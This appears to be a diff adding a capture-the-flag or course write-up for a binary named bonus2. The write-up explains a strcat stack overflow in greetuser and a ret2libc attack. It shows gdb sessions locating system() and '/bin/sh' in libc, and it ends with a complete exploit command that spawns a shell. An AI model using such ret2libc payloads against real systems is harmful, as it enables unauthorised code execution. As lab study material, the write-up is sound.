@@ -1,0 +1,82 @@
+The program uses strcat in greetuser, it can cause a stack overflow
+
+We see that the program segfaults when we send 40 chars to argv[1]
+and more than 18 on argv[2]
+
+Let's find where what we need to input to override the return pointer:
+
+gdb bonus2
+(gdb) r `python -c "print 'a' * 40"` aaaabbbbccccddddeeeeffffgggghhhh
+=> segfault
+(gdb) bt
+#0  0x08006868 in ?? ()
+#1  0x61616161 in ?? ()
+#2  0x61616161 in ?? ()
+
+The frame #0 seems to be partially overriden: 0x0800 has not been modified, 0x6868 is 'hh'
+
+We see that the program checks the LANG env variable, and changes the start of the string if the language is "fi" or "nl"
+
+Let's try with "fi":
+
+set environment LANG=fi
+(gdb) r `python -c "print 'a' * 40"` aaaabbbbccccddddeeeeffffgggghhhh
+=> segfault
+(gdb) bt
+#0  0x66666565 in ?? ()
+#1  0x67676666 in ?? ()
+#2  0x68686767 in ?? ()
+
+The return pointer is overriden, with 18 bytes of offset
+
+We don't really have a buffer large enough to use a shellcode in a buffer, luckily there are other ways:
+We can try a ret to libc attack
+
+For this we have to find the adress of a libc function and return to it, and add to it's arguments what we want
+We could try: system("/bin/sh") for example
+
+Let's find the adress of the function system:
+(gdb) info func system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+
+We now need to find the string "/bin/sh" in the libc library
+
+(gdb) info proc map
+process 10986
+Mapped address spaces:
+Start Addr   End Addr       Size     Offset objfile
+...
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+
+(gdb) find 0xb7e2c000, +0x1a3000, "/bin/sh"
+0xb7f8cc58
+1 pattern found.
+
+We now need to find where we can put this adress so that it is the first argument of "system"
+
+Break at the end of "greetuser"
+(gdb) b *0x08048528
+
+(gdb) r 0000111122223333444455556666777788889999 `python -c "print '.' * 18 + '\x60\xb0\xe6\xb7'"`
+Breakpoint 1, 0x08048528 in greetuser ()
+(gdb) ni
+0xb7e6b060 in system () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/3a $esp
+0xbffff650:	0x30303000	0x31313131	0x32323232
+
+The first argument is not the first at $esp, this is the return pointer of the function, it is actually the second
+chr(0x31) = '1', the argument is 4 bytes after the start of argv[1]
+
+Our exploit will then be
+
+export LANG=fi
+./bonus2 `python -c "print '.' * 4 + '\x58\xcc\xf8\xb7' + '.' * 32"` `python -c "print '.' * 18 + '\x60\xb0\xe6\xb7'"`
+
+And we have a shell
